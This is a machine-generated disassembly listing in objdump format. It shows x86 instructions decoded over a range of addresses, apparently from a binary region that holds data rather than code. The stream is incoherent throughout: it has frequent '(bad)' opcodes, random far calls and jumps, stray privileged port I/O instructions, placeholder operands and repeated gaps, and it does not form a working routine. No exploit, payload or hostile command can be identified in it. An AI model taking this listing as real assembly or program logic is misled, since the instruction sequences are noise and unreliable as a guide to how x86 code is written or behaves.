  4178f0:	lds    ebp,FWORD PTR [edi-0x4f]
  4178f3:	popf   
  4178f4:	(bad)  
  4178f5:	ins    BYTE PTR es:[edi],dx
  4178f6:	mov    ah,0xb3
  4178f8:	mov    bl,0xe2
  4178fa:	outs   dx,BYTE PTR ds:[esi]
  4178fb:	bnd jg 0x4178ba
  4178fe:	fld    st(2)
  417900:	ret    0xba57
  417903:	mov    ebx,0x9d86cb5c
  417908:	xor    DWORD PTR [esi+ecx*2],edx
  41790b:	fdivp  st(2),st
  41790d:	scas   eax,DWORD PTR es:[edi]
  41790e:	popf   
  41790f:	(bad)  
	...
  417971:	add    BYTE PTR [eax],al
  417973:	add    BYTE PTR [eax+0x41],bl
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	jno    0x417989
  417982:	pop    ecx
  417983:	js     0x417924
  417985:	stc    
  417986:	add    BYTE PTR [eax],al
  417988:	add    eax,0x1d000001
  41798d:	aaa    
  41798e:	inc    ebx
  41798f:	push   0xfffffff0
  417991:	cli    
  417992:	jecxz  0x417a0f
  417994:	imul   DWORD PTR [eax-0x4ff34dcd]
  41799a:	mov    BYTE PTR [eax-0x80],bl
  41799d:	retf   
  41799e:	jp     0x417996
  4179a0:	jno    0x417a0f
  4179a2:	fdivr  QWORD PTR [ebp+ebp*2+0x2d18e2bd]
  4179a9:	xor    eax,0x373be5d9
  4179ae:	xor    al,0x1d
  4179b0:	pop    ebp
  4179b1:	loopne 0x417a22
  4179b3:	xchg   esp,eax
  4179b4:	adc    DWORD PTR [ebx-0x6],0xffffffef
  4179b8:	and    BYTE PTR [ebp+0x62],ah
  4179bb:	js     0x4179a2
  4179bd:	dec    ebp
  4179be:	iret   
  4179bf:	dec    esp
  4179c0:	call   0xd51:0x4b195dc8
  4179c7:	inc    esp
  4179c8:	xchg   edi,eax
  4179c9:	sub    eax,0x97712ed2
  4179ce:	push   ds
  4179cf:	mov    ebp,esi
  4179d1:	sub    BYTE PTR [edi],0xc5
  4179d4:	inc    esp
  4179d5:	cwde   
  4179d6:	sti    
  4179d7:	or     al,0x93
  4179d9:	or     eax,0x72d2d8c9
  4179de:	xchg   esp,eax
  4179df:	mov    ?,eax
  4179e1:	xchg   esi,eax
  4179e2:	in     eax,0x72
  4179e4:	loop   0x4179bd
  4179e6:	mov    edi,0xff57a4cb
  4179eb:	bound  edi,QWORD PTR [eax+0x6a33298e]
  4179f1:	cld    
  4179f2:	ins    BYTE PTR es:[edi],dx
  4179f3:	sbb    BYTE PTR [ecx+0x180a1069],bh
  4179f9:	dec    edx
  4179fa:	and    al,0x1e
  4179fc:	mov    dh,0xbf
  4179fe:	pusha  
  4179ff:	ins    BYTE PTR es:[edi],dx
  417a00:	out    dx,eax
  417a01:	shl    eax,cl
  417a03:	test   ebx,0x8935a168
  417a09:	and    DWORD PTR [eax-0x2b],esi
  417a0c:	pop    edi
  417a0d:	test   DWORD PTR [ebp-0x70],ebp
  417a10:	lods   al,BYTE PTR ds:[esi]
  417a11:	call   0xd0fc:0xf38d1557
  417a18:	lods   al,BYTE PTR ds:[esi]
  417a19:	gs js  0x4179eb
  417a1c:	ja     0x417a74
  417a1e:	mov    bh,bl
  417a20:	xor    eax,0xf7b0dd21
  417a25:	adc    ch,BYTE PTR [edi+0x35502e19]
  417a2b:	adc    eax,DWORD PTR [esi-0x2428e404]
  417a31:	inc    edx
  417a32:	fsubr  DWORD PTR [ebx]
  417a34:	jb     0x4179f8
  417a36:	xchg   edi,eax
  417a37:	mov    cl,dh
  417a39:	adc    eax,0x1dff28e5
  417a3e:	dec    ebx
  417a3f:	in     eax,dx
  417a40:	xchg   esp,eax
  417a41:	xor    DWORD PTR [esi-0x4ab98ed3],0xd2977e57
  417a4b:	imul   esp,DWORD PTR [ecx],0xffffffa1
  417a4e:	and    edx,DWORD PTR [edx+0x71]
  417a51:	push   esp
  417a52:	ficomp DWORD PTR [ebp-0x2017364c]
  417a58:	lea    ebp,[eax-0x4f778cf5]
  417a5e:	mov    dh,BYTE PTR [edi+0x234a38e6]
  417a64:	fstp   st(1)
  417a66:	cld    
  417a67:	clc    
  417a68:	xlat   BYTE PTR ds:[ebx]
  417a69:	ret    0xa1ee
  417a6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a6d:	inc    eax
  417a6e:	mov    bl,0x26
  417a70:	popa   
  417a71:	(bad)  
  417a72:	add    esi,DWORD PTR [eax-0x7561cb9b]
  417a78:	cld    
  417a79:	sub    al,0x2e
  417a7b:	add    ebp,esp
  417a7d:	dec    ecx
  417a7e:	push   ecx
  417a7f:	add    al,0xf2
  417a81:	test   al,0xfd
  417a83:	jp     0x417a40
  417a85:	xor    DWORD PTR [edx+0x13],0xbbf44858
  417a8c:	es pop ebx
  417a8e:	mov    edx,DWORD PTR [eax-0x5c]
	...
  417af1:	add    BYTE PTR [eax],al
  417af3:	add    BYTE PTR [edi],ch
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx-0x3fe67ed4]
  417b04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b05:	cli    
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    eax,0x20000001
  417b0d:	mov    eax,ds:0xec92659e
  417b12:	inc    ecx
  417b13:	jne    0x417aaa
  417b15:	jmp    0xb1d9:0x66812a59
  417b1c:	jecxz  0x417b3a
  417b1e:	(bad)  
  417b1f:	mov    ecx,ebp
  417b21:	dec    esp
  417b22:	or     eax,0x88486f0d
  417b27:	mov    WORD PTR [edx+0x2e2d7ddc],cs
  417b2d:	mov    eax,ds:0x88d494f2
  417b32:	and    DWORD PTR [ecx],ecx
  417b34:	(bad)  
  417b35:	mov    ah,0x60
  417b37:	icebp  
  417b38:	dec    edi
  417b39:	mov    al,ds:0x3027fb85
  417b3e:	loope  0x417b48
  417b40:	push   edx
  417b41:	sub    eax,0xb71ad7fc
  417b46:	lea    ebp,[esi+0x6773ef52]
  417b4c:	jns    0x417ae4
  417b4e:	xchg   BYTE PTR [ebp-0x30],cl
  417b51:	ja     0x417bac
  417b53:	pop    esp
  417b54:	pop    ss
  417b55:	jmp    0x55ad71f2
  417b5a:	lods   eax,DWORD PTR ds:[esi]
  417b5b:	push   ebp
  417b5c:	sbb    bl,0x15
  417b5f:	mov    ah,0xd0
  417b61:	call   0x3ec7:0x27f835f7
  417b68:	stos   DWORD PTR es:[edi],eax
  417b69:	mov    al,ds:0xa9a739e9
  417b6e:	push   eax
  417b6f:	(bad)  
  417b70:	dec    eax
  417b71:	dec    eax
  417b72:	add    DWORD PTR [edx],0x5ddd1cf1
  417b78:	mov    bl,0xa1
  417b7a:	daa    
  417b7b:	icebp  
  417b7c:	and    edi,DWORD PTR [esi+0x19364f24]
  417b82:	in     al,0x89
  417b84:	sahf   
  417b85:	out    dx,al
  417b86:	aas    
  417b87:	push   ds
  417b88:	in     al,dx
  417b89:	cs or  eax,0x78bc1dec
  417b8f:	or     eax,0x260c55cc
  417b94:	push   edi
  417b95:	cmp    esi,DWORD PTR [ebp-0x1a]
  417b98:	dec    esi
  417b99:	push   ds
  417b9a:	retf   
  417b9b:	dec    eax
  417b9c:	or     edx,eax
  417b9e:	pop    es
  417b9f:	js     0x417bfe
  417ba1:	sti    
  417ba2:	push   ss
  417ba3:	xlat   BYTE PTR ds:[ebx]
  417ba4:	daa    
  417ba5:	imul   ebp,esi,0x51
  417ba8:	dec    eax
  417ba9:	mov    eax,ss
  417bab:	scas   al,BYTE PTR es:[edi]
  417bac:	sub    ebp,DWORD PTR [esi-0x21589bab]
  417bb2:	lods   al,BYTE PTR ds:[esi]
  417bb3:	xor    ch,BYTE PTR [eax]
  417bb5:	cs mov esi,esi
  417bb8:	cdq    
  417bb9:	fnstcw WORD PTR [eax+0x6fbb096e]
  417bbf:	pop    edi
  417bc0:	xor    eax,0xacb1f10f
  417bc5:	inc    ebp
  417bc6:	mov    ecx,0x928ec6b8
  417bcb:	not    DWORD PTR ds:0x1a5d11f0
  417bd1:	idiv   DWORD PTR [eax]
  417bd3:	cmp    dh,bh
  417bd5:	add    DWORD PTR ds:0xd5dbd6a2,0xfffffffe
  417bdc:	outs   dx,BYTE PTR ds:[esi]
  417bdd:	stos   BYTE PTR es:[edi],al
  417bde:	or     eax,0x160ca2ae
  417be3:	add    ebp,edx
  417be5:	push   0x4f304d9a
  417bea:	fsub   QWORD PTR [eax]
  417bec:	call   0xbfb0:0x96c8469c
  417bf3:	xchg   esi,eax
  417bf4:	fcmovbe st,st(6)
  417bf6:	xchg   ebp,esi
  417bf8:	mov    edi,0xfc024b6f
  417bfd:	shr    DWORD PTR [ebp+0xd],0x91
  417c01:	out    dx,eax
  417c02:	sub    ecx,ebp
  417c04:	stc    
  417c05:	cmp    DWORD PTR [eax],edi
  417c07:	outs   dx,DWORD PTR ds:[esi]
  417c08:	stos   DWORD PTR es:[edi],eax
  417c09:	aaa    
  417c0a:	sub    dh,BYTE PTR [edi+0x29e9ac6b]
  417c10:	aam    0x0
	...
  417c72:	add    BYTE PTR [eax],al
  417c74:	mov    eax,eax
  417c76:	nop
  417c77:	test   cl,bl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0xcb
  417c81:	nop
  417c82:	sahf   
  417c83:	and    ebp,DWORD PTR [ecx+0x50000fb]
  417c89:	add    DWORD PTR [eax],eax
  417c8b:	add    BYTE PTR [ecx+0x78b3b0a7],ch
  417c91:	sub    al,BYTE PTR [ebx-0x27]
  417c94:	jle    0x417c7e
  417c96:	xlat   BYTE PTR ds:[ebx]
  417c97:	mov    al,0x3
  417c99:	xchg   edx,eax
  417c9a:	icebp  
  417c9b:	enter  0x62ba,0xfb
  417c9f:	lea    ebx,[ecx]
  417ca1:	aas    
  417ca2:	mov    ah,0x79
  417ca4:	sti    
  417ca5:	mov    dh,0x56
  417ca7:	js     0x417d09
  417ca9:	lds    edx,FWORD PTR [ebx-0x4]
  417cac:	pop    ss
  417cad:	ss fstp st(7)
  417cb0:	rcr    al,0xa4
  417cb3:	jl     0x417ccb
  417cb5:	inc    edx
  417cb6:	inc    ecx
  417cb7:	loope  0x417d0a
  417cb9:	mov    ebp,0x263a07a9
  417cbe:	(bad)  
  417cbf:	ret    
  417cc0:	(bad)  
  417cc1:	jmp    0xf018:0x272ce8f9
  417cc8:	ja     0x417cdd
  417cca:	push   ebx
  417ccb:	daa    
  417ccc:	inc    ecx
  417ccd:	(bad)  
  417cce:	xor    al,BYTE PTR ds:0x9cab897c
  417cd4:	push   edi
  417cd5:	outs   dx,BYTE PTR ds:[esi]
  417cd6:	pop    ecx
  417cd7:	push   esp
  417cd8:	test   DWORD PTR [eax+0x8632067],0x9414ac12
  417ce2:	jmp    0x417d27
  417ce4:	retf   0x3ccb
  417ce7:	pop    ds
  417ce8:	jmp    0xb861:0x272f3129
  417cef:	test   eax,0x25056d0a
  417cf4:	mov    esi,0x77a279d6
  417cf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cfa:	aam    0x32
  417cfc:	lods   al,BYTE PTR ds:[esi]
  417cfd:	xor    ebp,esp
  417cff:	mov    ebp,DWORD PTR [edx+esi*2]
  417d02:	or     esi,ebp
  417d04:	sti    
  417d05:	fdivr  QWORD PTR [ecx]
  417d07:	push   edi
  417d08:	xchg   esp,eax
  417d09:	xor    al,BYTE PTR [edx+0x3f]
  417d0c:	pop    es
  417d0d:	dec    esp
  417d0e:	sub    DWORD PTR [ebx-0x68],ecx
  417d11:	scas   eax,DWORD PTR es:[edi]
  417d12:	test   al,0x7b
  417d14:	outs   dx,BYTE PTR ds:[esi]
  417d15:	push   edx
  417d16:	test   DWORD PTR [esi+ebx*2-0x6051223e],ebp
  417d1d:	push   eax
  417d1e:	cmp    al,0x1c
  417d20:	sbb    bh,cl
  417d22:	xchg   esi,eax
  417d23:	test   eax,0x61d59dd8
  417d28:	jge    0x417cf8
  417d2a:	sbb    eax,0x117faa9d
  417d2f:	push   ebp
  417d30:	adc    bl,BYTE PTR [esi]
  417d32:	sbb    bl,bh
  417d34:	push   edx
  417d35:	or     ch,bh
  417d37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d38:	mov    ds:0x52bcabed,al
  417d3d:	stos   BYTE PTR es:[edi],al
  417d3e:	push   ss
  417d3f:	sbb    eax,0xfec2d61b
  417d44:	cmp    BYTE PTR [edi],cl
  417d46:	inc    ecx
  417d47:	sub    BYTE PTR [eax+eiz*1],ah
  417d4a:	xchg   edi,eax
  417d4b:	shl    eax,1
  417d4d:	in     al,0xf0
  417d4f:	and    al,0xef
  417d51:	scas   al,BYTE PTR es:[edi]
  417d52:	in     eax,dx
  417d53:	add    BYTE PTR [ebp+0x53],ch
  417d56:	dec    ebp
  417d57:	and    al,0x59
  417d59:	imul   ecx,DWORD PTR [ebx],0x73a34dae
  417d5f:	push   ss
  417d60:	xchg   ebx,eax
  417d61:	jl     0x417daa
  417d63:	jmp    0xb23be88b
  417d68:	out    dx,eax
  417d69:	xlat   BYTE PTR ds:[ebx]
  417d6a:	sub    DWORD PTR [ecx],ebx
  417d6c:	fldcw  WORD PTR [ecx]
  417d6e:	aaa    
  417d6f:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  417d71:	lds    edx,FWORD PTR [ebx]
  417d73:	in     al,dx
  417d74:	cld    
  417d75:	fisubr DWORD PTR [esi-0x497b45da]
  417d7b:	nop
  417d7c:	(bad)  
  417d7d:	xchg   edi,eax
  417d7e:	in     eax,0xca
  417d80:	sar    dh,1
  417d82:	jmp    0xa870:0xba09e71
  417d89:	jo     0x417dd5
  417d8b:	adc    cl,BYTE PTR [eax-0x53]
  417d8e:	lods   eax,DWORD PTR ds:[esi]
  417d8f:	js     0x417d1f
	...
  417df1:	add    BYTE PTR [eax],al
  417df3:	add    BYTE PTR [edi],dl
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	jno    0x417e08
  417e02:	es dec eax
  417e04:	scas   al,BYTE PTR es:[edi]
  417e05:	cld    
  417e06:	add    BYTE PTR [eax],al
  417e08:	add    eax,0xec000001
  417e0d:	fld    DWORD PTR [edi+0x50cb773]
  417e13:	(bad)  
  417e14:	mov    BYTE PTR [edx],al
  417e16:	push   esp
  417e17:	push   es
  417e18:	jle    0x417e15
  417e1a:	xor    ebp,DWORD PTR [esi]
  417e1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e1d:	mov    dl,BYTE PTR [ebp+0x42d40118]
  417e23:	mov    esp,0x24c7bc64
  417e28:	imul   edi,DWORD PTR [ecx+0x52],0x369e50f6
  417e2f:	mov    eax,ds:0x2e9a981
  417e34:	leave  
  417e35:	dec    ecx
  417e36:	lods   eax,DWORD PTR ds:[esi]
  417e37:	or     al,0x2
  417e39:	and    edx,DWORD PTR [ecx+esi*1-0xa4d6de1]
  417e40:	mov    eax,0x95e35ae5
  417e45:	mov    esp,0x599a037c
  417e4a:	int    0xc5
  417e4c:	adc    al,0xe6
  417e4e:	into   
  417e4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e50:	or     ebx,DWORD PTR [ecx+0x60]
  417e53:	enter  0x7534,0xe6
  417e57:	mov    gs:0x3f5f7266,eax
  417e5d:	push   ecx
  417e5e:	sub    bl,cl
  417e60:	xchg   esi,eax
  417e61:	push   0x66fe1641
  417e66:	pop    edi
  417e67:	mov    ecx,0x5113e64b
  417e6c:	mov    ebp,es
  417e6e:	inc    edx
  417e6f:	scas   al,BYTE PTR es:[edi]
  417e70:	mov    esi,0x26a6ae0f
  417e75:	in     eax,dx
  417e76:	and    esp,0x24
  417e79:	rcl    DWORD PTR [edi],1
  417e7b:	call   0x32a409d3
  417e80:	aas    
  417e81:	mov    esp,ebp
  417e83:	mov    esi,0x265c982
  417e88:	fs cli 
  417e8a:	retf   0x86d5
  417e8d:	icebp  
  417e8e:	and    edi,ebx
  417e90:	(bad)  
  417e91:	shl    ebp,cl
  417e93:	dec    esi
  417e94:	retf   
  417e95:	pop    ss
  417e96:	cdq    
  417e97:	bound  esi,QWORD PTR [eax]
  417e99:	jbe    0x417ec5
  417e9b:	aaa    
  417e9c:	(bad)  
  417e9d:	imul   DWORD PTR [ebx]
  417e9f:	pushf  
  417ea0:	cmp    eax,0x8681f4fb
  417ea5:	std    
  417ea6:	mov    al,ds:0xfd63d9e6
  417eab:	pop    es
  417eac:	mov    eax,0xdfd2f38d
  417eb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417eb2:	adc    BYTE PTR [edi],al
  417eb4:	add    DWORD PTR [ebp+edi*1+0x1],esi
  417eb8:	cli    
  417eb9:	sbb    DWORD PTR [esi],ebp
  417ebb:	pop    ebx
  417ebc:	add    DWORD PTR [ebp-0x5d14ed69],ecx
  417ec2:	test   BYTE PTR [ecx+0xb],0x7e
  417ec6:	test   BYTE PTR [ebx],dh
  417ec8:	cmp    al,0xcc
  417eca:	sub    bl,BYTE PTR [esp+ebx*2-0x38]
  417ece:	mov    ah,0xd
  417ed0:	mov    bl,BYTE PTR [edi]
  417ed2:	fs mov dh,0x11
  417ed5:	bound  ecx,QWORD PTR [eax+0xa]
  417ed8:	stos   DWORD PTR es:[edi],eax
  417ed9:	push   ecx
  417eda:	call   FWORD PTR [edi]
  417edc:	pop    edx
  417edd:	pop    ss
  417ede:	aas    
  417edf:	in     al,0xc9
  417ee1:	mov    eax,ds:0x19502c7b
  417ee6:	popa   
  417ee7:	add    al,0xc
  417ee9:	mov    al,al
  417eeb:	aad    0xef
  417eed:	push   ebx
  417eee:	mov    eax,ds:0x46ee7942
  417ef3:	push   esp
  417ef4:	push   0xc8c8bd80
  417ef9:	push   ebx
  417efa:	mov    ebp,0x84daad45
  417eff:	ret    0x275
  417f02:	pop    es
  417f03:	xor    DWORD PTR [edx+esi*2],0xd448da4c
  417f0a:	push   ss
  417f0b:	fstp   st(1)
  417f0d:	ins    DWORD PTR es:[edi],dx
  417f0e:	add    eax,ecx
  417f10:	imul   eax,DWORD PTR [eax],0x0
	...
  417f73:	add    BYTE PTR [edx-0x1a],ah
  417f76:	out    0x3b,al
  417f78:	out    0x3b,al
  417f7a:	(bad)  
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	out    dx,al
  417f81:	das    
  417f82:	stc    
  417f83:	pop    ebx
  417f84:	mov    bl,0xfd
  417f86:	add    BYTE PTR [eax],al
  417f88:	add    eax,0x4e000001
  417f8d:	and    al,bh
  417f8f:	mov    ebp,0x707e4164
  417f94:	shl    dh,0x54
  417f97:	rcr    DWORD PTR [eax+0x718c62e9],1
  417f9d:	daa    
  417f9e:	fidiv  WORD PTR ds:0xe4a64896
  417fa4:	iret   
  417fa5:	ins    DWORD PTR es:[edi],dx
  417fa6:	pop    esp
  417fa7:	or     al,0xe5
  417fa9:	push   edx
  417faa:	out    0xc1,eax
  417fac:	daa    
  417fad:	or     eax,0x9d4aed5c
  417fb2:	sbb    al,BYTE PTR [ebp+0x20ce8f7d]
  417fb8:	jg     0x417fa4
  417fba:	lods   eax,DWORD PTR ds:[esi]
  417fbb:	inc    ebx
  417fbc:	dec    esi
  417fbd:	inc    edi
  417fbe:	test   BYTE PTR [esi],cl
  417fc0:	stos   DWORD PTR es:[edi],eax
  417fc1:	jg     0x417f4d
  417fc3:	neg    BYTE PTR [eax]
  417fc5:	cmp    DWORD PTR [ecx+0x3a4759f8],esp
  417fcb:	not    DWORD PTR [edx]
  417fcd:	imul   esi,edx,0xffffff82
  417fd0:	mov    ds:0xe9fa9f44,al
  417fd5:	push   0xdf45268f
  417fda:	lea    esp,[ebp+ebx*8-0xd4f3810]
  417fe1:	mov    eax,ds:0xc8d5cf13
  417fe6:	mov    ch,BYTE PTR [edi-0x2e3ff335]
  417fec:	call   0xb9da:0x8f28e1d4
  417ff3:	aaa    
  417ff4:	sub    al,0xe5
  417ff6:	into   
  417ff7:	adc    eax,0xdd6546c4
  417ffc:	inc    edi
  417ffd:	stos   BYTE PTR es:[edi],al
  417ffe:	jnp    0x418033
  418000:	and    BYTE PTR [edx],al
  418002:	push   ds
  418003:	addr16 icebp 
  418005:	adc    ebx,DWORD PTR ds:0x66393998
  41800b:	ss adc esi,ebx
  41800e:	pusha  
  41800f:	dec    ebx
  418010:	jae    0x417fe8
  418012:	xchg   esi,eax
  418013:	int    0xce
  418015:	lods   eax,DWORD PTR ds:[esi]
  418016:	std    
  418017:	mov    ebx,0x217dd1ab
  41801c:	lods   eax,DWORD PTR ds:[esi]
  41801d:	mov    ebp,0x8c371c6c
  418022:	push   cs
  418023:	or     al,0x62
  418025:	inc    esp
  418026:	cmp    eax,0xe7ae10a3
  41802b:	sar    DWORD PTR [edi],1
  41802d:	mov    ds:0xcc733e4b,eax
  418032:	sar    DWORD PTR [ebx-0x600aaf01],1
  418038:	sub    BYTE PTR [ebx],0x27
  41803b:	xor    DWORD PTR [ecx+0x51],esi
  41803e:	mov    ebp,0x53b197b9
  418043:	add    al,0x45
  418045:	scas   eax,DWORD PTR es:[edi]
  418046:	adc    dh,BYTE PTR [ecx]
  418048:	mov    eax,0x786e7fbf
  41804d:	enter  0x48e4,0x63
  418051:	ja     0x417fdf
  418053:	sub    al,0x74
  418055:	or     eax,0x55c2cf44
  41805a:	out    dx,al
  41805b:	sbb    eax,0xa745fdae
  418060:	stc    
  418061:	adc    bl,BYTE PTR [ecx]
  418063:	push   0xffffffed
  418065:	stos   BYTE PTR es:[edi],al
  418066:	int3   
  418067:	iret   
  418068:	push   ebx
  418069:	cdq    
  41806a:	(bad)  
  41806c:	dec    ebx
  41806d:	ret    0xe5e5
  418070:	test   DWORD PTR [ecx+0x47],ebp
  418073:	dec    esi
  418074:	stos   BYTE PTR es:[edi],al
  418075:	fsubrp st(0),st
  418077:	je     0x4180a9
  418079:	mov    eax,ds:0xa89dae6d
  41807e:	mov    al,0x1c
  418080:	inc    edi
  418081:	mov    WORD PTR [ecx+0x1c],?
  418084:	js     0x4180c9
  418086:	cmp    edi,ebp
  418088:	outs   dx,BYTE PTR ds:[esi]
  418089:	xchg   ecx,eax
  41808a:	sub    DWORD PTR ss:[edi-0x6fe607be],edx
	...
  4180f1:	add    BYTE PTR [eax],al
  4180f3:	add    BYTE PTR [ecx-0xba9482],ch
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0x3c2fdebc,eax
  418101:	adc    eax,0xfeb84e18
  418106:	add    BYTE PTR [eax],al
  418108:	add    eax,0x93000001
  41810d:	xchg   ebp,eax
  41810e:	mov    ebp,0x3c4182d6
  418113:	pop    ecx
  418114:	mov    cl,0xb2
  418116:	pop    ebx
  418117:	jb     0x418119
  418119:	push   ds
  41811a:	ja     0x4180e8
  41811c:	mov    ds:0xd3f3d540,eax
  418121:	dec    edx
  418122:	mov    ah,0xf
  418124:	mov    esi,0x91cc4513
  418129:	(bad)  
  41812a:	push   ds
  41812b:	and    ch,BYTE PTR [esi-0x7cc83735]
  418131:	sbb    eax,DWORD PTR [ebx]
  418133:	mov    bl,0x9b
  418135:	jb     0x418109
  418137:	sub    eax,0x1cb497d
  41813c:	xchg   ah,ch
  41813e:	mov    WORD PTR [eax],?
  418140:	(bad)  
  418141:	sahf   
  418142:	adc    BYTE PTR [edi],cl
  418144:	hlt    
  418145:	mov    al,ds:0x9dc54775
  41814a:	dec    edi
  41814b:	leave  
  41814c:	jns    0x41814f
  41814e:	jo     0x41817c
  418150:	xchg   edi,eax
  418151:	scas   al,BYTE PTR es:[edi]
  418152:	cld    
  418153:	pop    es
  418154:	gs daa 
  418156:	jecxz  0x4181c0
  418158:	stos   DWORD PTR es:[edi],eax
  418159:	pop    ebp
  41815a:	sahf   
  41815b:	jae    0x41815b
  41815d:	mov    ecx,0xdacb423e
  418162:	aaa    
  418163:	call   0x4613cf66
  418168:	or     DWORD PTR [esi+0x28a3c78c],eax
  41816e:	inc    eax
  41816f:	ds xchg edi,eax
  418171:	add    ebp,DWORD PTR [ebp-0x59]
  418174:	jae    0x41817e
  418176:	sbb    bl,ah
  418178:	sbb    ch,dl
  41817a:	xchg   esp,eax
  41817b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41817c:	mov    eax,ds:0x6cd49ee5
  418182:	out    dx,eax
  418183:	or     DWORD PTR [esi],ebp
  418185:	mov    al,ds:0x7fc4a397
  41818a:	and    ch,BYTE PTR [ebp-0x5b88ba30]
  418190:	sub    eax,0x8431ba61
  418195:	adc    eax,0xc2bef90f
  41819a:	mov    bh,BYTE PTR [esi+0x2b]
  41819d:	mov    BYTE PTR [edx],dh
  41819f:	retf   0xbbe3
  4181a2:	xchg   ecx,eax
  4181a3:	rcl    DWORD PTR [ebp+0x40],1
  4181a6:	add    BYTE PTR [esi],al
  4181a8:	jge    0x41812c
  4181aa:	add    al,0xf4
  4181ac:	push   esp
  4181ad:	sbb    eax,0xa21c7f0e
  4181b2:	cmp    ah,BYTE PTR [ebx]
  4181b4:	inc    ebx
  4181b5:	jnp    0x418231
  4181b7:	loope  0x418175
  4181b9:	mov    dh,0x69
  4181bb:	pop    ds
  4181bc:	pop    esp
  4181bd:	int3   
  4181be:	xlat   BYTE PTR ds:[ebx]
  4181bf:	adc    BYTE PTR [eax+0x2f21d3ad],bh
  4181c5:	mov    cl,0x4e
  4181c7:	mov    al,ds:0x6e2f29c7
  4181cc:	mov    ebx,0x8d63d6d4
  4181d1:	ins    DWORD PTR es:[edi],dx
  4181d2:	jne    0x418236
  4181d4:	inc    edx
  4181d5:	ja     0x4181dc
  4181d7:	inc    edx
  4181d8:	pop    ebx
  4181d9:	pop    edi
  4181da:	add    BYTE PTR [esi],ah
  4181dc:	retf   
  4181dd:	jno    0x418193
  4181df:	xchg   ebx,eax
  4181e0:	push   0x7d
  4181e2:	or     al,0xa2
  4181e4:	pop    edi
  4181e5:	repz mov eax,0xd004e9d9
  4181eb:	or     BYTE PTR [edx+ebp*8+0x6bd2b75d],ch
  4181f2:	mov    ebp,0x933fb365
  4181f7:	push   ds
  4181f8:	sbb    ah,dh
  4181fa:	cmp    BYTE PTR [eax],0xe8
  4181fd:	call   0xed91:0xdf8e4b29
  418204:	into   
  418205:	fcomip st,st(0)
  418207:	ds mov dh,0x4b
  41820a:	call   0xfebb05f1
  41820f:	iret   
  418210:	adc    DWORD PTR [eax],eax
	...
  418272:	add    BYTE PTR [eax],al
  418274:	aaa    
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0x80cab8d6
  418282:	push   esi
  418283:	cmp    DWORD PTR [ebp+0x50000ff],edi
  418289:	add    DWORD PTR [eax],eax
  41828b:	add    BYTE PTR [ebp+0x57328ff4],al
  418291:	inc    ebx
  418292:	out    dx,eax
  418293:	(bad)  
  418296:	mov    WORD PTR [ebx+edx*2-0x28],ds
  41829a:	and    eax,0xd2a1dfee
  41829f:	adc    al,0xe5
  4182a1:	sbb    BYTE PTR [ebp-0x1ef088e7],bl
  4182a7:	cmp    esp,DWORD PTR [edx+eiz*2]
  4182aa:	ins    DWORD PTR es:[edi],dx
  4182ab:	adc    eax,0xa4d07186
  4182b0:	jg     0x41823d
  4182b2:	loope  0x418256
  4182b4:	mov    WORD PTR [edi],fs
  4182b6:	cmp    DWORD PTR [esp+ebp*8],esp
  4182b9:	outs   dx,DWORD PTR ds:[esi]
  4182ba:	sbb    BYTE PTR [edx-0x7f],bh
  4182bd:	aad    0x82
  4182bf:	and    DWORD PTR [ebp-0x5e481d9d],ebx
  4182c5:	push   ebx
  4182c6:	bound  ebp,QWORD PTR cs:[edx]
  4182c9:	repnz mov ds:0x5b3192b7,al
  4182cf:	adc    eax,0xf5ed6571
  4182d4:	pusha  
  4182d5:	cwde   
  4182d6:	icebp  
  4182d7:	jnp    0x4182da
  4182d9:	push   0xdfaf05af
  4182de:	mov    dh,0xfb
  4182e0:	inc    ecx
  4182e1:	ins    BYTE PTR es:[edi],dx
  4182e2:	in     al,dx
  4182e3:	cdq    
  4182e4:	push   ds
  4182e5:	(bad)  
  4182e6:	stos   BYTE PTR es:[edi],al
  4182e7:	popa   
  4182e8:	je     0x41827a
  4182ea:	aam    0xd4
  4182ec:	inc    esi
  4182ed:	jmp    0x8d22:0x45b52b5c
  4182f4:	ret    
  4182f5:	sahf   
  4182f6:	inc    ecx
  4182f7:	test   DWORD PTR [esi+0x2b],ebp
  4182fa:	inc    esp
  4182fb:	sub    DWORD PTR [ebp-0x77883afd],ebx
  418301:	pop    eax
  418302:	fs es loop 0x418353
  418306:	push   ebp
  418307:	mov    esi,0x4146a54c
  41830c:	mov    bl,BYTE PTR [ebp-0x11973f75]
  418312:	cld    
  418313:	xor    ch,BYTE PTR [esi+0x729dd354]
  418319:	gs aas 
  41831b:	xchg   esi,eax
  41831d:	call   0xebb37978
  418322:	cli    
  418323:	cmp    BYTE PTR [esi+0x4ffb009b],bh
  418329:	cmp    BYTE PTR [eax-0x28],bl
  41832c:	test   BYTE PTR [eax],dh
